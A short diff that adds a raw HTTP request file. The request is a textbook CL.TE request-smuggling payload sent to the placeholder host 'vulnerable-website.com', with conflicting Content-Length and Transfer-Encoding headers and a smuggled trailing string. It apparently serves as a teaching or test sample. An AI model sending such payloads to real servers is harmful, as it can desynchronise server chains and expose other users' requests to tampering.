@@ -1,0 +1,8 @@
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
